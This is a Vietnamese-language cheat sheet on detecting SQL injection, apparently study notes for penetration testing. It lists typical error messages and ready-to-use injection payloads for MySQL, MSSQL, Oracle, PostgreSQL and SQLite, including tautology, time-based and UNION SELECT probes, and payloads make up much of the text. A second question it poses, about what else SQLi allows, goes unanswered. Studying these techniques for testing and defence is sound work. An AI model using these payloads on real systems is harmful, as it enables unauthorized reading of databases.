
1. Các phát hiện đối với mỗi loại db như kiểu SQL server thì có dấu hiệu gì

2. Ngoài thu thập dữ liệu từ db qua SQLi thì còn có thể làm được gì thêm 

1. Dấu hiệu chung để phát hiện SQLi

Ứng dụng trả về lỗi SQL (error-based), ví dụ:

MySQL: You have an error in your SQL syntax;

MSSQL: Unclosed quotation mark after the character string;

Oracle: ORA-00933: SQL command not properly ended

Ứng dụng trả về kết quả bất thường khi thêm ' OR 1=1 --.

Dữ liệu bị lọc hoặc thay đổi khi thêm ', ", --, #, ;.

Kết quả trả về chậm bất thường khi dùng payload kiểu Time-based (SLEEP(), WAITFOR DELAY, …).

Kết quả thay đổi khi chèn payload Union-based (UNION SELECT NULL,...).

🗄️ 2. Theo từng loại Database
2.1 MySQL

Ký tự nhạy cảm: ', ", --, #, /* */

Phát hiện bằng lỗi:

' OR '1'='1


→ Thường báo lỗi: You have an error in your SQL syntax.

Payload time-based:

' AND SLEEP(5) --+


Union-based test:

' UNION SELECT 1,2,3 --+

2.2 Microsoft SQL Server (MSSQL)

Ký tự nhạy cảm: ', ", --, ;

Lỗi thường thấy: Unclosed quotation mark after the character string.

Payload time-based:

' WAITFOR DELAY '0:0:5' --


Union test:

' UNION SELECT 1,@@version,db_name() --

2.3 Oracle

Ký tự nhạy cảm: ', --, /* */

Lỗi thường: ORA-01756: quoted string not properly terminated

Payload time-based:

' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --


Union test (Oracle bắt buộc phải FROM DUAL):

' UNION SELECT 'test' FROM DUAL --

2.4 PostgreSQL

Ký tự nhạy cảm: ', --, /* */

Lỗi thường: syntax error at or near

Payload time-based:

' OR pg_sleep(5) --


Union test:

' UNION SELECT version(), current_database() --

2.5 SQLite

Ký tự nhạy cảm: ', --, /* */

Lỗi thường: near "…" : syntax error

Payload test:

' OR 1=1 --


Time-based:

' OR randomblob(1000000000) --

